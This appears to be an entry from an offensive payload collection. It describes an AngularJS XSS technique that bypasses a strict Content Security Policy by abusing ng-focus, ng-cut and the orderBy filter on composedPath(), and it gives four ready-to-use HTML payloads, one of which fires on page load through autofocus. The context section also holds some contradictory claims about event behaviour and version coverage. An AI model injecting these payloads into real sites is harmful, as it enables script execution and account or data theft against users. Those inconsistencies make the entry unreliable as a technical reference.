---
title: AngularJS CSP Bypass via ng-focus + orderBy + composedPath()
slug: angular-csp-bypass-orderby
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/csti, sink/angularjs, sink/csp-bypass]
inbound: []
---

# AngularJS CSP Bypass via ng-focus + orderBy + composedPath()

## Payload

```html
<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
```

## Variants

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>
<div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div>
```

## Context

Bypasses strict CSP (`script-src 'nonce-...'` with no `unsafe-eval`) by using AngularJS's `orderBy` filter to invoke `Array.from` or an assigned variable as a function — no `eval` or `new Function` is called directly. `$event.composedPath()` returns the DOM event path array; `orderBy` evaluates the second argument as a JS expression in Angular's expression evaluator. The `ng-cut` variant fires on clipboard paste. The `ng-repeat`/`$event.view` variant (v1.2.0–1.5.0) traverses the event view object to reach `window.alert`. Works across all AngularJS versions (all browsers). The `autofocus` attribute makes `ng-focus` fire without user interaction.

## Provenance

- Distilled from: `../../techniques/dom-xss/framework-vectors-angular.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [AngularJS Framework Vectors](../../techniques/dom-xss/framework-vectors-angular.md)
- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
